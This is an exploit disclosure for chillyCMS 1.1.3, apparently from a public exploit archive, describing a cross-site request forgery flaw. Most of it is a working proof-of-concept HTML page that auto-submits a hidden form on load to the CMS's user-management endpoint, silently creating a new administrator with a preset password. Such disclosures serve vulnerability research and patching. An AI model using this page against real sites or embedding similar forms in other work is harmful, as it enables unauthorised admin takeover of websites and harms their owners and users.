<!------------------------------------------------------------------------
# Software................chillyCMS 1.1.3
# Vulnerability...........Cross-site Request Forgery
# Download................http://chillycms.bplaced.net/chillyCMS/
# Release Date............7/11/2010
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................John Leitch
# Site....................http://cross-site-scripting.blogspot.com/
# Email...................john.leitch5@gmail.com
# ------------------------------------------------------------------------
# 
# --Description--
# 
# A cross-site request forgery vulnerability in chillyCMS 1.1.3 can be
# exploited to create a new admin.
# 
# 
# --PoC-->

<html>
    <body onload="document.forms[0].submit()">
        <form method="POST" action="http://localhost/chillyCMS/admin/usersgroups.site.php">
            <input type="hidden" name="user" value="new_admin" />
            <input type="hidden" name="name" value="a" />
            <input type="hidden" name="pw" value="Password1" />
            <input type="hidden" name="pw2" value="Password1" />
            <input type="hidden" name="email" value="" />
            <input type="hidden" name="gids%5B%5D" value="1" />
            <input type="hidden" name="gids%5B%5D" value="3" />
            <input type="hidden" name="gids%5B%5D" value="4" />
            <input type="hidden" name="active" value="1" />
            <input type="hidden" name="language" value="en" />
            <input type="hidden" name="getnewsletter" value="1" />
            <input type="hidden" name="myaction" value="new" />
            <input type="hidden" name="action" value="updateuser" />
            <input type="hidden" name="id" value="" />
        </form>
    </body>
</html>
